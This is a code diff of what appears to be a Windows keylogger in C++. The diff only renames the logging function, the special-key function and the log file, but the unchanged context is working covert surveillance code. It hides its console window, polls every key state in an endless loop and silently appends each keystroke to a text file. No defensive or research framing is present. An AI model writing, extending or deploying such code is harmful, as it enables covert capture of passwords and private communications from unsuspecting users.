@@ -5,18 +5,18 @@
 
 using namespace std;
 
-string Log_File="log_file.txt";
+string LogFile="LogFile.txt";
 
 // Function to save information in a file
-void SaveInFile(string Information){
+void save_changes(string Information){
     fstream logFile;
-    logFile.open(Log_File,ios::app);
+    logFile.open(LogFile,ios::app);
     logFile << Information;
     logFile.close();
 }
 
 // Function to convert special keys to strings
-string SpecialKeys(int key) {
+string special_keys(int key) {
     string result;
     switch (key) {
         case VK_SPACE:
@@ -173,19 +173,18 @@ int main() {
     bool isSpecial;
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
-    while (1){
-        for(int i = 8 ; i <= 190 ; i++){
+    while (true){        for(int i = 8 ; i <= 190 ; i++){
             if(GetAsyncKeyState(i) == -32767){
                 isSpecial = std::find(std::begin(special_Key),std::end(special_Key),i) != std::end(special_Key);
                 if(isSpecial){
-                    specialK = SpecialKeys(i);
-                    SaveInFile(specialK);
+                    specialK = special_keys(i);
+                    save_changes(specialK);
                 }
                 else{
                     if(GetKeyState(VK_CAPITAL)){
-                        SaveInFile(string(1,(char) i));
+                        save_changes(string(1,(char) i));
                     }else{
-                        SaveInFile(string(1, (char)std::tolower(i)));
+                        save_changes(string(1, (char)std::tolower(i)));
                     }
                 }
 
